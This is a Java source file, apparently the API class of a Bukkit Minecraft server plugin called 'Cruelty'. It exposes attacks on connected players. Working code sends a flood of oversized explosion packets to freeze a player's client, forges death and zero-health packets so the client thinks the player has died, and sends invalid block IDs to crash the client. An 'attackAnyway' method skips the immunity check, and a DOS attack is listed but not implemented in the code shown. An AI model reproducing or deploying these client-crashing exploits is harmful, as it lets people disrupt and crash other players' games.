package com.wolflink289.apis.bukkit;

import java.util.ArrayList;
import java.util.Random;
import net.minecraft.server.Packet38EntityStatus;
import net.minecraft.server.Packet60Explosion;
import net.minecraft.server.Packet8UpdateHealth;
import net.minecraft.server.Vec3D;
import org.bukkit.craftbukkit.entity.CraftPlayer;
import org.bukkit.entity.Player;
import com.wolflink289.bukkit.cruelty.CrueltyPermissions;

/**
 * The API for the Cruelty Bukkit plugin found at http://dev.bukkit.org/server-mods/cruelty/
 * 
 * @author Wolflink289
 */
public final class Cruelty {
	
	/**
	 * An enum containing the available attacks.
	 * 
	 * @author Wolflink289
	 */
	static public enum Attacks {
		/**
		 * Initiate a simulated denial of service attack on a player.
		 */
		DOS(CrueltyPermissions.DOS),
		
		/**
		 * Crash a player's client.
		 */
		CRASH(CrueltyPermissions.CRASH),
		
		/**
		 * Trick the player's client into thinking it's dead.
		 */
		FEIGN(CrueltyPermissions.FEIGN),
		
		/**
		 * Freeze a player's client indefinately.
		 */
		FREEZE(CrueltyPermissions.FREEZE);
		
		private CrueltyPermissions perm;
		
		private Attacks(CrueltyPermissions permission) {
			perm = permission;
		}
		
		/**
		 * Check if the player is immune to the attack.
		 * 
		 * @return whether they are immune or not.
		 */
		public boolean isImmune(Player player) {
			return perm.hasImmunity(player);
		}
	}
	
	/**
	 * Attack a player with a cruelty feature.
	 * 
	 * @param attack the attack feature to use.
	 * @param target the player to target.
	 * @return true if attacked, false if not allowed or null variables passed.
	 */
	static public boolean attack(Attacks attack, Player target) {
		if (attack == null || target == null) return false;
		return doAttack(attack, target, true);
	}
	
	/**
	 * Attack a player with a cruelty feature regardless of whether or not they are immune.
	 * 
	 * @param attack the attack feature to use.
	 * @param target the player to target.
	 * @return true if attacked, false null variables passed.
	 */
	static public boolean attackAnyway(Attacks attack, Player target) {
		if (attack == null || target == null) return false;
		return doAttack(attack, target, false);
	}
	
	/**
	 * <b>PRIVATE: </b>Do the attack.
	 */
	static private boolean doAttack(Attacks attack, Player target, boolean canbeimmune) {
		if (attack == Attacks.FREEZE) {
			// Immunity + Cast Checks
			if (canbeimmune && attack.isImmune(target)) return false;
			if (!(target instanceof CraftPlayer)) return false;
			
			// Action - Generate Packet
			CraftPlayer crafttarget = (CraftPlayer) target;
			Packet60Explosion packet = new Packet60Explosion(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ(), 20F, new ArrayList<Object>(), Vec3D.a(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ()));
			
			// Action - Send Packets
			for (int j = 0; j < 100; j++)
				crafttarget.getHandle().netServerHandler.sendPacket(packet);
			
			// Clean
			crafttarget = null;
			packet = null;
			return true;
		}
		if (attack == Attacks.FEIGN) {
			// Immunity + Cast Checks
			if (canbeimmune && attack.isImmune(target)) return false;
			if (!(target instanceof CraftPlayer)) return false;
			
			// Action - Generate Packet
			CraftPlayer crafttarget = (CraftPlayer) target;
			Packet38EntityStatus packet1 = new Packet38EntityStatus();
			Packet8UpdateHealth packet2 = new Packet8UpdateHealth();
			
			packet1.a = crafttarget.getHandle().id;
			packet1.b = (byte) 2;
			
			packet2.a = 0;
			packet2.b = 0;
			packet2.c = 0F;
			
			// Action - Send Packets
			crafttarget.getHandle().netServerHandler.sendPacket(packet1);
			crafttarget.getHandle().netServerHandler.sendPacket(packet2);
			
			// Clean
			crafttarget = null;
			packet1 = null;
			packet2 = null;
			return true;
		}
		if (attack == Attacks.CRASH) {
			// Immunity Check
			if (canbeimmune && attack.isImmune(target)) return false;
			if (!(target instanceof CraftPlayer)) return false;
			
			// Action - Crash
			Random random = new Random(System.currentTimeMillis());
			for (int i = 0; i < 10; i++) {
				target.sendBlockChange(target.getLocation(), random.nextInt(2674) - 1337, (byte) 0);
			}
			
			target.sendBlockChange(target.getLocation(), -6666, (byte) 0);
			target.sendBlockChange(target.getLocation(), 6666, (byte) 0);
			
			// Clean
			random = null;
			return true;
		}
		
		return false;
	}
}
